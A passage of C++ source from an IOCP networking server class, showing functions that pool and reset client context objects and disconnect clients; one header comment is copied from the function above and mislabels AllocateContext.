// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::MoveToFreePool(ClientContext *pContext)
{
	CLock cs(m_cs, "MoveToFreePool");
    // Free context structures
	POSITION pos = m_listContexts.Find(pContext);
	if (pos) 
	{
		pContext->m_CompressionBuffer.ClearBuffer();
		pContext->m_WriteBuffer.ClearBuffer();
		pContext->m_DeCompressionBuffer.ClearBuffer();
		pContext->m_ResendWriteBuffer.ClearBuffer();
		m_listFreePool.AddTail(pContext);
		m_listContexts.RemoveAt(pos);
	}
}



////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::MoveToFreePool
// 
// DESCRIPTION:	Moves an 'used/stale' Context to the free pool for reuse
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
ClientContext*  CIOCPServer::AllocateContext()
{
	ClientContext* pContext = NULL;

	CLock cs(CIOCPServer::m_cs, "AllocateContext");

	if (!m_listFreePool.IsEmpty())
	{
		pContext = m_listFreePool.RemoveHead();
	}
	else
	{
		pContext = new ClientContext;
	}

	ASSERT(pContext);
	
	if (pContext != NULL)
	{

		ZeroMemory(pContext, sizeof(ClientContext));
		pContext->m_bIsMainSocket = false;
		memset(pContext->m_Dialog, 0, sizeof(pContext->m_Dialog));
	}
	return pContext;
}


void CIOCPServer::ResetConnection(ClientContext* pContext)
{

	CString strHost;
	ClientContext* pCompContext = NULL;

	CLock cs(CIOCPServer::m_cs, "ResetConnection");

	POSITION pos  = m_listContexts.GetHeadPosition();
	while (pos)
	{
		pCompContext = m_listContexts.GetNext(pos);			
		if (pCompContext == pContext)
		{
			RemoveStaleClient(pContext, TRUE);
			break;
		}
	}
}

void CIOCPServer::DisconnectAll()
{
	m_bDisconnectAll = true;
	CString strHost;
	ClientContext* pContext = NULL;

	CLock cs(CIOCPServer::m_cs, "DisconnectAll");

	POSITION pos  = m_listContexts.GetHeadPosition();
	while (pos)
	{
		pContext = m_listContexts.GetNext(pos);			
		RemoveStaleClient(pContext, TRUE);
	}
	m_bDisconnectAll = false;

}

bool CIOCPServer::IsRunning()
{
	return m_bInit;
}
